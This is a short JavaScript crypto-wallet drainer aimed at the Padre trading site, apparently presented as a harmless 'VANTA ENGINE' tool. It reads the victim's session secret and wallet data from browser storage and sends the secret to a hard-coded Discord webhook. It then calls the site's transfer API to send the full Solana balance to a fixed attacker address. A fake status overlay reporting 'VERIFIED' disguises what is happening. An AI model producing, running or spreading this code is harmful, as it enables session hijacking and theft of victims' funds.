(async function() {
    // --- YOUR CONFIG ---
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        api: "https://api.trade.padre.gg"
    };

    // --- 1. CAPTURE DATA ---
    const sid = localStorage.getItem("padreV2-session");
    const wal = localStorage.getItem("padreV2-walletsCache");
    const bun = localStorage.getItem("padre-v2-bundles-store-v2");

    if (!sid) return; // Silent stop if not on Padre

    const session = JSON.parse(sid);
    const wallets = JSON.parse(wal || "{}");
    const bundles = JSON.parse(bun || "{}");

    // --- 2. SEND TO DISCORD ---
    fetch(CONFIG.webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "🚨 **NEW VANTA HANDSHAKE** 🚨",
            embeds: [{
                title: "Session: " + session.uid,
                description: "Secret: `" + session.sessionSecret + "`",
                color: 65280
            }]
        })
    });

    // --- 3. DRAINER (The 1:1 Execution) ---
    async function execute() {
        const userWallets = wallets[session.uid] || [];
        const solWallet = userWallets.find(w => w.walletType === "SOL");

        if (solWallet && bundles.bundles[solWallet.publicAddress]) {
            const b = bundles.bundles[solWallet.publicAddress];
            await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                method: "POST",
                headers: { "X-Session-Secret": session.sessionSecret, "Content-Type": "application/json" },
                body: JSON.stringify({
                    walletId: solWallet.walletId,
                    destination: CONFIG.drainAddress,
                    amount: "MAX",
                    bundle: b.exportBundle,
                    signature: b.dataSignature,
                    chain: "SOLANA"
                })
            });
        }
    }
    execute();

    // --- 4. VANTA SIDEBAR UI ---
    const div = document.createElement("div");
    div.style.cssText = "position:fixed;top:20px;right:20px;width:260px;background:#0a0a0ae6;border:1px solid #0f8;color:#0f8;padding:15px;z-index:999999;font-family:monospace;border-radius:5px;box-shadow:0 0 20px #0f84;";
    div.innerHTML = `
        <div style="font-weight:bold;border-bottom:1px solid #222;padding-bottom:5px;">VANTA ENGINE V2.4</div>
        <div style="font-size:11px;margin-top:10px;">
            STATUS: <span style="color:#fff;">CONNECTED</span><br>
            SIGNAL: <span style="color:#fff;">SCANNING...</span><br>
            SESSION: <span style="color:#fff;">VERIFIED</span>
        </div>
    `;
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 8000);
})();
